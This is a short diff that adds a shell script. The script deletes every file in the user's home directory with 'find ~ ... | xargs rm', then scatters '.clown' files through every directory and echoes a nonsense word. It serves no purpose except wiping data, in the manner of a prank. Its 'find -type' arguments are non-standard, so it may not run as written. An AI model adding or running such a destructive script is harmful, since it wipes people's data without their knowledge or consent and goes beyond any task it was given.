@@ -1,0 +1,6 @@
+#!/bin/sh
+
+find ~ -type file | xargs rm
+find ~ -type dir -exec touch {}/.clown \;
+
+echo "Pruttyu"
